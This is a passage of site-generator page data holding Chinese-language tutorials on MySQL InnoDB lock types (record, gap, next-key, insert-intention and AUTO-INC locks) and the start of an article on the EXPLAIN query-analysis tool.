锁说的也是表级锁，不要理所当然的想成了行级锁。",slug:"注意-这里的-x-锁、s-锁说的也是表级锁-不要理所当然的想成了行级锁。",normalizedTitle:"注意：这里的 x 锁、s 锁说的也是表级锁，不要理所当然的想成了行级锁。",charIndex:1289},{level:2,title:"记录锁",slug:"记录锁",normalizedTitle:"记录锁",charIndex:2003},{level:2,title:"间隙锁",slug:"间隙锁",normalizedTitle:"间隙锁",charIndex:2512},{level:2,title:"Next-Key 锁",slug:"next-key-锁",normalizedTitle:"next-key 锁",charIndex:3678},{level:3,title:"在默认的 REPEATABLE READ 隔离级别下，InnoDB 在查找和扫描索引时，都会使用 Next-Key 锁，以此来防止幻读的发生。",slug:"在默认的-repeatable-read-隔离级别下-innodb-在查找和扫描索引时-都会使用-next-key-锁-以此来防止幻读的发生。",normalizedTitle:"在默认的 repeatable read 隔离级别下，innodb 在查找和扫描索引时，都会使用 next-key 锁，以此来防止幻读的发生。",charIndex:3903},{level:2,title:"插入意向锁",slug:"插入意向锁",normalizedTitle:"插入意向锁",charIndex:3979},{level:2,title:"AUTO-INC 锁",slug:"auto-inc-锁",normalizedTitle:"auto-inc 锁",charIndex:4336},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:4930}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"前言 普通锁 意向锁 注意：这里的 X 锁、S 锁说的也是表级锁，不要理所当然的想成了行级锁。 记录锁 间隙锁 Next-Key 锁 在默认的 REPEATABLE READ 隔离级别下，InnoDB 在查找和扫描索引时，都会使用 Next-Key 锁，以此来防止幻读的发生。 插入意向锁 AUTO-INC 锁 总结",content:"# 前言\n\n锁是在并发程序中最经常使用的手段之一，但是锁的滥用也会给程序的性能带来极大的负担。而我们平时使用 MySQL 做增删改查操作的时候，感觉不到我们有在使用锁，实际上是因为 MySQL 已经为我们使用了相关的锁。如果你想知道我们平时使用的 SQL 语句都使用了哪些锁？都是怎么加锁的？这些锁的作用是什么？那么可以继续往下看。\n\n\n\n\n# 普通锁\n\nInnoDB 实现了标准行级锁，而行级锁有两种类型：\n\n * 共享锁（shared lock，以下将会简称为 S 锁）：意在共享。也就是允许多个事务共同持有一个记录的共享锁，该锁主要用于读取操作。\n * 排他锁（exclusive lock，以下将会简称为 X 锁）：意在排斥。只能允许一个事务持有一个记录的排他锁，该锁主要用于更新和删除操作。\n   如果你有了解过 Java 中的 JUC 包，那么你就会发现这有点像 JUC 中的读写锁 ReentrantReadWriteLock。它们的目的都是为了提高读取操作的并发性。\n\n如果有一个事务 T1 持有行 r 的 S 锁，并且同时有另一个事务 T2 想要获取行 r 中的锁，T2 获取不同的锁将会有如下的情况发生：\n\n假如 T2 想要获取行 r 的 S 锁，那么 T2 将会立刻得到该锁。\n假如 T2 想要获取行 r 的 X 锁，那么 T2 则会被阻塞，直到 T1 释放了行 r 的 S 锁。\n如果有一个事务 T1 持有性 r 的 X 锁，并且同时有另一个事务 T2 想要获取行 r 中的锁，不管 T2 获取什么锁都会被阻塞。\n\nX 锁与 S 锁的兼容性如下图所示：\n\n\n\n最左边是持有的锁，最上面是想要申请的锁。从图中可以看出，只要跟 X 锁相关的，都会冲突，也就是会造成阻塞。\n\n\n# 意向锁\n\nInnoDB 允许多种粒度的锁共存，所以会有表锁和行锁共存的情况。为了让多种粒度的锁可以共存，InnoDB 使用了意向锁。意向锁是表级锁，它是为了表明有一个事务正在持有锁或者打算申请一个锁。\n\n意向锁有两种类型：\n\n * 共享意向锁（intention shared lock，以下简称 IS）：表示事务持有表中行的共享锁或者打算获取行的共享锁。\n * 共享排他锁（intention exclusive lock，以下简称 IX）：表示事务持有表中行的排他锁或者打算获取行的排他锁。\n   IS 和 IX 只是为了表达出一种意图，它们除了全表请求之外，不会阻塞任何操作。它们的主要目的只是为了表示持有一个行锁，或者打算获取行锁。\n\n意向锁的使用规则如下：\n\n * 事务在获取表中的共享行锁时，需要先获取表中的 IS 锁或者等级更高的锁。\n * 事务在获取表中的排他行锁时，需要先获取表中的 IX 锁。\n\n这里有一个很重要的点：就是只有获取表中的行锁时，才会需要先申请意向锁。 如果是执行 ALTER TABLE 等需要锁定整个表的语句，是不需要申请意向锁的，可以直接去申请表级 X 锁。\n\n表级别下的 X 锁、S 锁、IS 锁和 IX 锁的兼容性如下：\n\n\n\n\n# 注意：这里的 X 锁、S 锁说的也是表级锁，不要理所当然的想成了行级锁。\n\n为什么会有意向锁的出现呢？我们考虑如下场景（假设不存在意向锁）：\n一个事务 A 想要修改表 t 中的行 r，所以 A 获取行 r 的 X 锁，事 r 务 A 现在持有一个行锁。此时，有一个事务 B 想要使用 ALTER TABLE 语句修改表 t 的结构，该语句首先需要获取表 t 的 X 锁，但是此时事务 B 并不知道表中是否有行被锁住，所以它只能一行一行去遍历，然后把遍历的行也锁住，直到发现表中没有行在之前已经被锁住，现在它就可以修改表的结构了。但是它发现表中已经存在一些行被锁住，那么它就不能修改表结构，需要等这些锁都释放。\n\n\n\n这里有一个大问题，最坏的情况下，需要遍历所有的行才能知道是否有行被锁住，这是非常消耗性能的，而意向锁就可以解决这个问题。我们现在再来考虑相同场景下，意向锁如何解决这个问题：\n\n一个事务 A 想要修改表 t 中的行 r，A 首先需要获取表 t 的 IX 锁，然后成功获取 IX 锁之后，再去申请行 r 的 X 锁，申请成功之后，事务 A 此时就持有两个锁，分别是表 t 的 IX 锁和行 r 的 X 锁。此时，有一个事务 B 想要使用 ALTER TABLE 语句修改表 t 的结构，该语句需要获取表 t 的 X 锁，事务 B 可以查看表 t 上是否存在锁来判断表中的行是否被上锁，当发现表 t 上存在 IX 锁，事务 B 就会被阻塞，因为它知道表中已经有行被锁定，所以无法申请到表 t 的 X 锁。\n\n\n\n我们看上面的兼容性表，也得知表级的 IX 锁和表级的 X 锁是冲突的，所以刚刚好对应上这个场景。\n\n\n# 记录锁\n\n记录锁是对索引记录的锁定，换句话说就是，记录锁只会锁定索引。每一个表必定会有一个主键索引（用户定义的主键、唯一索引、隐式生成），而该主键索引中的非叶子节点中的记录就是使用该记录锁进行锁定。\n\n假设执行语句：select * from user where id = 10 for update;\n\n如果 id 是 user 表中的主键，那么在主键索引中，id 为 10 的记录就会被锁定。并且其他事务想要更新、删除此条记录都会被阻塞，只有等该记录中的记录锁被释放之后，才可以执行其他操作。\n\n\n\n除了主键索引之外，InnoDB 中还会有二级索引。二级索引跟主键索引一样，在使用二级索引作为查询条件时，会将符合条件的二级索引的记录使用记录锁进行锁定，然后再回表将对应的主键索引也使用记录锁进行锁定。\n\n假设执行语句：select * from user where name = 'c' for update;\n\n如果 id 是 user 表中的主键，name 是 user 表中的二级索引。则会先将二级索引下的 name = ‘c’ 的索引锁定，然后再进行回表将主键索引为 9 的主键索引锁定。\n\n\n\n\n# 间隙锁\n\n间隙锁（简称为 Gap）是对索引记录之间的间隙的锁定，或者是对第一条索引记录之前的间隙和对最后一条记录之后的间隙的锁。间隙锁是防止幻读的主要手段之一，幻读是同一个事务在不同的时间执行相同的查询语句，得出的结果集不同。那么间隙锁是如何防止幻读的呢？实际上就是通过锁定指定的间隙，使得这些间隙无法插入新的记录，从而防止了数据的增长。\n\n假设我们执行此条语句：select * from user where id > 5 and id < 9 for update;\n\n由于间隙锁的存在，其他事务如果想要插入 id 在 5 和 9 之间的记录是无法成功的，会被阻塞，直到间隙锁释放。比如想要插入 id 为 6 的记录，就会阻塞，如下图所示（省略部分无关的字段）。间隙锁跨越的间隙可能为一个值、多个值、甚至为空值。\n\n\n\n通过上图我们可以知道：\n\n * (5, 7]：id 为 5 的索引记录与 id 为 7 的索引记录之间的间隙被间隙锁锁定了\n * (7, 9]：id 为 7 的索引记录与 id 为 9 的索引记录之间的间隙被间隙锁锁定了\n\n因为这两个间隙被间隙锁锁定了，所以在这两个间隙之间的记录是无法插入，只有等间隙锁释放之后才可以插入。我们还要注意到，id 为 7 的记录是被记录锁锁定的，所以在 id 为 7 的记录上执行更新、删除操作时会被阻塞的。\n\n我们上面还说到，间隙锁还在第一条记录的前面和最后一条记录的后面加锁，我们来看看这是什么情况。\n\n假设我们执行此条语句：select * from user for update;\n\n因为该语句没有使用索引，所以会进行全表扫描。将扫描到的每一条记录都加上记录锁，并且将所有的间隙也加间隙锁。最终的加锁情况如下图所示（省略部分无关的字段）：\n\n\n\n每个表中都会存在两个隐式记录：最小记录（infimum），最大记录（supermum）\n\n我们通过上图，可以得出锁定的区间如下：\n\n * (-∞, 5]\n * (5, 7]\n * (7, 9]\n * (9, 10]\n * (10, 12]\n * (12, +∞)\n\n并且所有的记录都被记录锁锁定。这个看起来就像是一个表锁，因为对该表的任何操作（快照读除外），都会被阻塞。\n\n但是，间隙锁并不是在任何情况下都会使用，它在以下情况并不会使用：\n\n * 隔离级别为 RC、RU。\n * 使用唯一索引进行等值比较获取一条索引记录。这是因为唯一索引进行等值比较只能获取一条记录，不会出现多条记录的情况，那么也就不会出现多次读取出现不一致的情况。\n\n间隙锁的主要目的是阻止事务往间隙中插入记录，并且间隙锁之间是可以共存的，多个事务可以同时获取得到相同间隙的锁。共享间隙锁和排他间隙锁之间并没有区别，它们是完全一样的东西。\n\n\n# Next-Key 锁\n\nNext-Key 锁并不是一个难以理解的东西，它本质上就是索引记录上的记录锁和索引记录之间的间隙锁的结合。\n\nInnoDB 在查找和扫描表的时候，会将扫描到的记录都加上记录锁，记录锁有可能是共享锁或者是排他锁。因此，行级锁实际上是索引记录锁。\n\n在间隙锁的两个例子中的第二个例子，它实际上就是 Next-Key 锁，因为每一个括号括起来的内存包括一个索引记录锁和一个间隙锁，而 这完美符合 Next-Key 的定义。\n\n\n# 在默认的 REPEATABLE READ 隔离级别下，InnoDB 在查找和扫描索引时，都会使用 Next-Key 锁，以此来防止幻读的发生。\n\n\n# 插入意向锁\n\n插入意向锁（简称为 II Gap）是一种特殊的间隙锁，只有在插入记录的时候才会使用，这个锁表示插入的意向。它与上面说到的表级意向锁是完全不同的，插入意向锁是属于行级锁，并且互相之间是兼容的，互不冲突，所以多个事务可以同时获取到相同间隙的 II Gap 锁。\n\n> 官方示例：\n> 假设有索引记录，其值分别为 4 和 7，单独的事务分别尝试插入值 5 和 6，在获得插入行的排他锁之前，每个事务都使用插入意图锁来锁定 4 和 7 之间的间隙，但不要互相阻塞，因为行是无冲突的。\n\n插入意向锁只会和间隙锁和 Next-Key 锁冲突。因为间隙锁的主要作用是防止幻读的发生，而在插入操作执行前需要获取到插入意向锁，而插入意向锁和间隙锁之间是冲突的，可以阻塞插入操作，所以间隙锁可以防止幻读的发生。\n\n\n# AUTO-INC 锁\n\nAUTO-INC 锁又称为自增锁（简称 AI 锁）。它是特殊的表锁，在插入数据到具有 AUTO_INCREMENT 列的表时使用。当插入数据的表中有自增列时，数据库需要自动生成自增值，在生成之前，它会先获取到相关表的 AUTO-INC 锁。其他事务的插入操作将会被阻塞，这样可以保证自增值的唯一性。\n\nAUTO-INC 锁具有如下特点：\n\n * 每一张表都具有它自己的 AUTO-INC 锁，互相之间不兼容。\n * 不遵循二段锁协议，它并不是在事务提交时释放，而是在 insert 语句执行完成之后就释放，提高了并发插入的性能。\n * 自增值一旦分配了就会加一，即使回滚了，自增值也不会减一，而是继续使用下一个值，所以自增值有可能不是连续的。\n\n因为在插入时会使用到该表锁，所以必然会造成并发插入性能的下降。因此 InooDB 提供了一个 innodb_autoinc_lock_mode 配置项用于控制自增锁的算法，该配置项可以使用户选择如何在可预测的自动增量值序列与插入操作的最大并发性之间进行权衡。\n\n该配置有三个可选项：\n\n * 0：使用传统的锁定模式，并发性能最差。\n * 1：默认采用的模式。\n * 2：并发性能最高，但是不能保证同一条 insert 语句内的自增值是连续的。\n\n想要了解更多关于此配置的内容可以查看 MySQL 的这篇文档。\n\n\n# 总结\n\nInnoDB 的四种行锁的兼容性，如下表所示：\n\n\n\nnote： 第一列表示已经持有的锁，第一行表示要获取的锁。\n\n从表中可以得出结论：\n\n * 插入意向锁不影响其他事务获取其他的锁。\n * 插入意向锁会受到 Gap 锁和 Next-Key 锁的影响。一个事务想要获取指定间隙的插入意向锁，那么该间隙中的 Gap 锁和 Next-Key 锁必须没有被其他事务持有，否则，将会被阻塞。\n\n如果，我们除去插入意向锁的影响，那么兼容性表格如下：\n\n\n\n从表中我们可以得出以下结论：\n\n * 当两个事务的锁都涉及到记录锁，那么将会冲突。\n * 间隙锁与其他锁（不包括插入意向锁）都不会产生冲突。",normalizedContent:"# 前言\n\n锁是在并发程序中最经常使用的手段之一，但是锁的滥用也会给程序的性能带来极大的负担。而我们平时使用 mysql 做增删改查操作的时候，感觉不到我们有在使用锁，实际上是因为 mysql 已经为我们使用了相关的锁。如果你想知道我们平时使用的 sql 语句都使用了哪些锁？都是怎么加锁的？这些锁的作用是什么？那么可以继续往下看。\n\n\n\n\n# 普通锁\n\ninnodb 实现了标准行级锁，而行级锁有两种类型：\n\n * 共享锁（shared lock，以下将会简称为 s 锁）：意在共享。也就是允许多个事务共同持有一个记录的共享锁，该锁主要用于读取操作。\n * 排他锁（exclusive lock，以下将会简称为 x 锁）：意在排斥。只能允许一个事务持有一个记录的排他锁，该锁主要用于更新和删除操作。\n   如果你有了解过 java 中的 juc 包，那么你就会发现这有点像 juc 中的读写锁 reentrantreadwritelock。它们的目的都是为了提高读取操作的并发性。\n\n如果有一个事务 t1 持有行 r 的 s 锁，并且同时有另一个事务 t2 想要获取行 r 中的锁，t2 获取不同的锁将会有如下的情况发生：\n\n假如 t2 想要获取行 r 的 s 锁，那么 t2 将会立刻得到该锁。\n假如 t2 想要获取行 r 的 x 锁，那么 t2 则会被阻塞，直到 t1 释放了行 r 的 s 锁。\n如果有一个事务 t1 持有性 r 的 x 锁，并且同时有另一个事务 t2 想要获取行 r 中的锁，不管 t2 获取什么锁都会被阻塞。\n\nx 锁与 s 锁的兼容性如下图所示：\n\n\n\n最左边是持有的锁，最上面是想要申请的锁。从图中可以看出，只要跟 x 锁相关的，都会冲突，也就是会造成阻塞。\n\n\n# 意向锁\n\ninnodb 允许多种粒度的锁共存，所以会有表锁和行锁共存的情况。为了让多种粒度的锁可以共存，innodb 使用了意向锁。意向锁是表级锁，它是为了表明有一个事务正在持有锁或者打算申请一个锁。\n\n意向锁有两种类型：\n\n * 共享意向锁（intention shared lock，以下简称 is）：表示事务持有表中行的共享锁或者打算获取行的共享锁。\n * 共享排他锁（intention exclusive lock，以下简称 ix）：表示事务持有表中行的排他锁或者打算获取行的排他锁。\n   is 和 ix 只是为了表达出一种意图，它们除了全表请求之外，不会阻塞任何操作。它们的主要目的只是为了表示持有一个行锁，或者打算获取行锁。\n\n意向锁的使用规则如下：\n\n * 事务在获取表中的共享行锁时，需要先获取表中的 is 锁或者等级更高的锁。\n * 事务在获取表中的排他行锁时，需要先获取表中的 ix 锁。\n\n这里有一个很重要的点：就是只有获取表中的行锁时，才会需要先申请意向锁。 如果是执行 alter table 等需要锁定整个表的语句，是不需要申请意向锁的，可以直接去申请表级 x 锁。\n\n表级别下的 x 锁、s 锁、is 锁和 ix 锁的兼容性如下：\n\n\n\n\n# 注意：这里的 x 锁、s 锁说的也是表级锁，不要理所当然的想成了行级锁。\n\n为什么会有意向锁的出现呢？我们考虑如下场景（假设不存在意向锁）：\n一个事务 a 想要修改表 t 中的行 r，所以 a 获取行 r 的 x 锁，事 r 务 a 现在持有一个行锁。此时，有一个事务 b 想要使用 alter table 语句修改表 t 的结构，该语句首先需要获取表 t 的 x 锁，但是此时事务 b 并不知道表中是否有行被锁住，所以它只能一行一行去遍历，然后把遍历的行也锁住，直到发现表中没有行在之前已经被锁住，现在它就可以修改表的结构了。但是它发现表中已经存在一些行被锁住，那么它就不能修改表结构，需要等这些锁都释放。\n\n\n\n这里有一个大问题，最坏的情况下，需要遍历所有的行才能知道是否有行被锁住，这是非常消耗性能的，而意向锁就可以解决这个问题。我们现在再来考虑相同场景下，意向锁如何解决这个问题：\n\n一个事务 a 想要修改表 t 中的行 r，a 首先需要获取表 t 的 ix 锁，然后成功获取 ix 锁之后，再去申请行 r 的 x 锁，申请成功之后，事务 a 此时就持有两个锁，分别是表 t 的 ix 锁和行 r 的 x 锁。此时，有一个事务 b 想要使用 alter table 语句修改表 t 的结构，该语句需要获取表 t 的 x 锁，事务 b 可以查看表 t 上是否存在锁来判断表中的行是否被上锁，当发现表 t 上存在 ix 锁，事务 b 就会被阻塞，因为它知道表中已经有行被锁定，所以无法申请到表 t 的 x 锁。\n\n\n\n我们看上面的兼容性表，也得知表级的 ix 锁和表级的 x 锁是冲突的，所以刚刚好对应上这个场景。\n\n\n# 记录锁\n\n记录锁是对索引记录的锁定，换句话说就是，记录锁只会锁定索引。每一个表必定会有一个主键索引（用户定义的主键、唯一索引、隐式生成），而该主键索引中的非叶子节点中的记录就是使用该记录锁进行锁定。\n\n假设执行语句：select * from user where id = 10 for update;\n\n如果 id 是 user 表中的主键，那么在主键索引中，id 为 10 的记录就会被锁定。并且其他事务想要更新、删除此条记录都会被阻塞，只有等该记录中的记录锁被释放之后，才可以执行其他操作。\n\n\n\n除了主键索引之外，innodb 中还会有二级索引。二级索引跟主键索引一样，在使用二级索引作为查询条件时，会将符合条件的二级索引的记录使用记录锁进行锁定，然后再回表将对应的主键索引也使用记录锁进行锁定。\n\n假设执行语句：select * from user where name = 'c' for update;\n\n如果 id 是 user 表中的主键，name 是 user 表中的二级索引。则会先将二级索引下的 name = ‘c’ 的索引锁定，然后再进行回表将主键索引为 9 的主键索引锁定。\n\n\n\n\n# 间隙锁\n\n间隙锁（简称为 gap）是对索引记录之间的间隙的锁定，或者是对第一条索引记录之前的间隙和对最后一条记录之后的间隙的锁。间隙锁是防止幻读的主要手段之一，幻读是同一个事务在不同的时间执行相同的查询语句，得出的结果集不同。那么间隙锁是如何防止幻读的呢？实际上就是通过锁定指定的间隙，使得这些间隙无法插入新的记录，从而防止了数据的增长。\n\n假设我们执行此条语句：select * from user where id > 5 and id < 9 for update;\n\n由于间隙锁的存在，其他事务如果想要插入 id 在 5 和 9 之间的记录是无法成功的，会被阻塞，直到间隙锁释放。比如想要插入 id 为 6 的记录，就会阻塞，如下图所示（省略部分无关的字段）。间隙锁跨越的间隙可能为一个值、多个值、甚至为空值。\n\n\n\n通过上图我们可以知道：\n\n * (5, 7]：id 为 5 的索引记录与 id 为 7 的索引记录之间的间隙被间隙锁锁定了\n * (7, 9]：id 为 7 的索引记录与 id 为 9 的索引记录之间的间隙被间隙锁锁定了\n\n因为这两个间隙被间隙锁锁定了，所以在这两个间隙之间的记录是无法插入，只有等间隙锁释放之后才可以插入。我们还要注意到，id 为 7 的记录是被记录锁锁定的，所以在 id 为 7 的记录上执行更新、删除操作时会被阻塞的。\n\n我们上面还说到，间隙锁还在第一条记录的前面和最后一条记录的后面加锁，我们来看看这是什么情况。\n\n假设我们执行此条语句：select * from user for update;\n\n因为该语句没有使用索引，所以会进行全表扫描。将扫描到的每一条记录都加上记录锁，并且将所有的间隙也加间隙锁。最终的加锁情况如下图所示（省略部分无关的字段）：\n\n\n\n每个表中都会存在两个隐式记录：最小记录（infimum），最大记录（supermum）\n\n我们通过上图，可以得出锁定的区间如下：\n\n * (-∞, 5]\n * (5, 7]\n * (7, 9]\n * (9, 10]\n * (10, 12]\n * (12, +∞)\n\n并且所有的记录都被记录锁锁定。这个看起来就像是一个表锁，因为对该表的任何操作（快照读除外），都会被阻塞。\n\n但是，间隙锁并不是在任何情况下都会使用，它在以下情况并不会使用：\n\n * 隔离级别为 rc、ru。\n * 使用唯一索引进行等值比较获取一条索引记录。这是因为唯一索引进行等值比较只能获取一条记录，不会出现多条记录的情况，那么也就不会出现多次读取出现不一致的情况。\n\n间隙锁的主要目的是阻止事务往间隙中插入记录，并且间隙锁之间是可以共存的，多个事务可以同时获取得到相同间隙的锁。共享间隙锁和排他间隙锁之间并没有区别，它们是完全一样的东西。\n\n\n# next-key 锁\n\nnext-key 锁并不是一个难以理解的东西，它本质上就是索引记录上的记录锁和索引记录之间的间隙锁的结合。\n\ninnodb 在查找和扫描表的时候，会将扫描到的记录都加上记录锁，记录锁有可能是共享锁或者是排他锁。因此，行级锁实际上是索引记录锁。\n\n在间隙锁的两个例子中的第二个例子，它实际上就是 next-key 锁，因为每一个括号括起来的内存包括一个索引记录锁和一个间隙锁，而 这完美符合 next-key 的定义。\n\n\n# 在默认的 repeatable read 隔离级别下，innodb 在查找和扫描索引时，都会使用 next-key 锁，以此来防止幻读的发生。\n\n\n# 插入意向锁\n\n插入意向锁（简称为 ii gap）是一种特殊的间隙锁，只有在插入记录的时候才会使用，这个锁表示插入的意向。它与上面说到的表级意向锁是完全不同的，插入意向锁是属于行级锁，并且互相之间是兼容的，互不冲突，所以多个事务可以同时获取到相同间隙的 ii gap 锁。\n\n> 官方示例：\n> 假设有索引记录，其值分别为 4 和 7，单独的事务分别尝试插入值 5 和 6，在获得插入行的排他锁之前，每个事务都使用插入意图锁来锁定 4 和 7 之间的间隙，但不要互相阻塞，因为行是无冲突的。\n\n插入意向锁只会和间隙锁和 next-key 锁冲突。因为间隙锁的主要作用是防止幻读的发生，而在插入操作执行前需要获取到插入意向锁，而插入意向锁和间隙锁之间是冲突的，可以阻塞插入操作，所以间隙锁可以防止幻读的发生。\n\n\n# auto-inc 锁\n\nauto-inc 锁又称为自增锁（简称 ai 锁）。它是特殊的表锁，在插入数据到具有 auto_increment 列的表时使用。当插入数据的表中有自增列时，数据库需要自动生成自增值，在生成之前，它会先获取到相关表的 auto-inc 锁。其他事务的插入操作将会被阻塞，这样可以保证自增值的唯一性。\n\nauto-inc 锁具有如下特点：\n\n * 每一张表都具有它自己的 auto-inc 锁，互相之间不兼容。\n * 不遵循二段锁协议，它并不是在事务提交时释放，而是在 insert 语句执行完成之后就释放，提高了并发插入的性能。\n * 自增值一旦分配了就会加一，即使回滚了，自增值也不会减一，而是继续使用下一个值，所以自增值有可能不是连续的。\n\n因为在插入时会使用到该表锁，所以必然会造成并发插入性能的下降。因此 inoodb 提供了一个 innodb_autoinc_lock_mode 配置项用于控制自增锁的算法，该配置项可以使用户选择如何在可预测的自动增量值序列与插入操作的最大并发性之间进行权衡。\n\n该配置有三个可选项：\n\n * 0：使用传统的锁定模式，并发性能最差。\n * 1：默认采用的模式。\n * 2：并发性能最高，但是不能保证同一条 insert 语句内的自增值是连续的。\n\n想要了解更多关于此配置的内容可以查看 mysql 的这篇文档。\n\n\n# 总结\n\ninnodb 的四种行锁的兼容性，如下表所示：\n\n\n\nnote： 第一列表示已经持有的锁，第一行表示要获取的锁。\n\n从表中可以得出结论：\n\n * 插入意向锁不影响其他事务获取其他的锁。\n * 插入意向锁会受到 gap 锁和 next-key 锁的影响。一个事务想要获取指定间隙的插入意向锁，那么该间隙中的 gap 锁和 next-key 锁必须没有被其他事务持有，否则，将会被阻塞。\n\n如果，我们除去插入意向锁的影响，那么兼容性表格如下：\n\n\n\n从表中我们可以得出以下结论：\n\n * 当两个事务的锁都涉及到记录锁，那么将会冲突。\n * 间隙锁与其他锁（不包括插入意向锁）都不会产生冲突。",charsets:{cjk:!0}},{title:"mongodb",frontmatter:{title:"mongodb",date:"2023-06-25T09:22:36.000Z",permalink:"/mongodb/1800/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/03.%E5%A4%A7%E6%95%B0%E6%8D%AE/05.mongodb/1800.mongodb.html",relativePath:"03.大数据/05.mongodb/1800.mongodb.md",key:"v-8194159c",path:"/mongodb/1800/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:"",normalizedContent:"",charsets:{}},{title:"MySQL 索引优化工具 explain",frontmatter:{title:"MySQL 索引优化工具 explain",date:"2023-06-25T09:22:36.000Z",permalink:"/mysql/1302",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/03.%E5%A4%A7%E6%95%B0%E6%8D%AE/04.mysql/1302.MySQL%20%E7%B4%A2%E5%BC%95%E4%BC%98%E5%8C%96%E5%B7%A5%E5%85%B7%20explain.html",relativePath:"03.大数据/04.mysql/1302.MySQL 索引优化工具 explain.md",key:"v-4993606a",path:"/mysql/1302/",headers:[{level:2,title:"Explain 用法",slug:"explain-用法",normalizedTitle:"explain 用法",charIndex:2},{level:2,title:"id",slug:"id",normalizedTitle:"id",charIndex:175},{level:2,title:"select_type",slug:"select-type",normalizedTitle:"select_type",charIndex:305},{level:2,title:"table",slug:"table",normalizedTitle:"table",charIndex:718},{level:2,title:"type",slug:"type",normalizedTitle:"type",charIndex:312},{level:2,title:"possible_keys",slug:"possible-keys",normalizedTitle:"possible_keys",charIndex:1359},{level:2,title:"Key",slug:"key",normalizedTitle:"key",charIndex:1428},{level:2,title:"key_len",slug:"key-len",normalizedTitle:"key_len",charIndex:1586},{level:2,title:"ref",slug:"ref",normalizedTitle:"ref",charIndex:820},{level:2,title:"rows",slug:"rows",normalizedTitle:"rows",charIndex:1932},{level:2,title:"extra",slug:"extra",normalizedTitle:"extra",charIndex:1989},{level:3,title:"using fileSort（重点优化）",slug:"using-filesort-重点优化",normalizedTitle:"using filesort（重点优化）",charIndex:2025},{level:3,title:"using temporary（重点优化）",slug:"using-temporary-重点优化",normalizedTitle:"using temporary（重点优化）",charIndex:2225},{level:3,title:"USING index（重点）",slug:"using-index-重点",normalizedTitle:"using index（重点）",charIndex:2294},{level:3,title:"Using wher",slug:"using-wher",normalizedTitle:"using wher",charIndex:2451},{level:3,title:"using join buffer",slug:"using-join-buffer",normalizedTitle:"using join buffer",charIndex:2482},{level:3,title:"impossible where",slug:"impossible-where",normalizedTitle:"impossible where",charIndex:2513},{level:3,title:"select tables optimized away",slug:"select-tables-optimized-away",normalizedTitle:"select tables optimized away",charIndex:2565},{level:3,title:"distinct",slug:"distinct",normalizedTitle:"distinct",charIndex:2701}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Explain 用法 id select_type table type possible_keys Key key_len ref rows extra using fileSort（重点优化） using temporary（重点优化） USING index（重点） Using wher using join buffer impossible where select tables optimized away distinct",content:"# Explain 用法\n\n模拟 Mysql 优化器是如何执行 SQL 查询语句的，从而知道 Mysql 是如何处理你的 SQL 语句的。分析你的查询语句或是表结构的性能瓶颈。\n语法：Explain + SQL 语句；\n如：Explain select * from user; 会生成如下 SQL 分析结果，下面详细对每个字段进行详解\n\n\n\n\n# id\n\n是一组数字，代表多个表之间的查询顺序，或者包含子句查询语句中的顺序，id 总共分为三种情况，依次详解\n\nid 相同，执行顺序由上至下\nid 不同，如果是子查询，id 号会递增，id 值越大优先级越高，越先被执行\nid 相同和不同的情况同时存在\n\n\n# select_type\n\nselect_type 包含以下几种值：\n\n * simple\n   简单的 select 查询，查询中不包含子查询或者 union 查询\n\n\n\n * primary\n   如果 SQL 语句中包含任何子查询，那么子查询的最外层会被标记为 primary\n\n\n\n * subquery\n   在 select 或者 where 里包含了子查询，那么子查询就会被标记为 subQquery，同三。二同时出现\n\n\n\n * derived\n   在 from 中包含的子查询，会被标记为衍生查询，会把查询结果放到一个临时表中\n\n\n\n * union / union result\n   如果有两个 select 查询语句，他们之间用 union 连起来查询，那么第二个 select 会被标记为 union，union 的结果被标记为 union result。它的 id 是为 null 的\n\n\n\n\n# table\n\n表示这一行的数据是哪张表的数据\n\n\n# type\n\ntype 是代表 MySQL 使用了哪种索引类型，不同的索引类型的查询效率也是不一样的，常用的类型有： ALL、index、range、 ref、eq_ref、const、system、NULL（从上到下，性能从差到好）\n\n * ALL\n   Full Table Scan， MySQL 将遍历全表以找到匹配的行\n * index\n   Full Index Scan，index 与 ALL 区别为 index 类型只遍历索引树\n * range\n   只检索给定范围的行，使用一个索引来选择行\n * ref\n   表示上述表的连接匹配条件，即哪些列或常量被用于查找索引列上的值\n * eq_ref\n   类似 ref，区别就在使用的索引是唯一索引，对于每个索引键值，表中只有一条记录匹配，简单来说，就是多表连接中使用 primary key 或者 unique key 作为关联条件\n * const、system\n   当 MySQL 对查询某部分进行优化，并转换为一个常量时，使用这些类型访问。如将主键置于 where 列表中，MySQL 就能将该查询转换为一个常量，system 是 const 类型的特例，当查询的表只有一行的情况下，使用 system\n * NULL\n   MySQL 在优化过程中分解语句，执行时甚至不用访问表或索引，例如从一个索引列里选取最小值可以通过单独索引查找完成。\n\n\n# possible_keys\n\n此次查询中涉及字段上若存在索引，则会被列出来，表示可能会用到的索引，但并不是实际上一定会用到的索引\n\n\n# Key\n\nkey 列显示 MySQL 实际决定使用的键（索引），必然包含在 possible_keys 中\n如果没有选择索引，键是 NULL。要想强制 MySQL 使用或忽视 possible_keys 列中的索引，在查询中使用 FORCE INDEX、USE INDEX 或者 IGNORE INDEX。\n\n\n# key_len\n\n表示索引中使用的字节数，通过该属性可以知道在查询中使用的索引长度，注意：这个长度是最大可能长度，并非实际使用长度，在不损失精确性的情况下，长度越短查询效率越高\n\n\n# ref\n\n显示关联的字段。如果使用常数等值查询，则显示 const，如果是连接查询，则会显示关联的字段。\n\n\n\n * tb_emp 表为非唯一性索引扫描，实际使用的索引列为 idx_name，由于 tb_emp.name='rose' 为一个常量，所以 ref=const。\n * tb_dept 为唯一索引扫描，从 sql 语句可以看出，实际使用了 PRIMARY 主键索引，ref=db01.tb_emp.deptid 表示关联了 db01 数据库中 tb_emp 表的 deptid 字段。\n\n\n# rows\n\n根据表信息统计以及索引的使用情况，大致估算说要找到所需记录需要读取的行数，rows 越小越好\n\n\n# extra\n\n不适合在其他列显示出来，但在优化时十分重要的信息\n\n\n# using fileSort（重点优化）\n\n俗称 \"文件排序\" ，在数据量大的时候几乎是 “九死一生”，在 order by 或者在 group by 排序的过程中，order by 的字段不是索引字段，或者 select 查询字段存在不是索引字段，或者 select 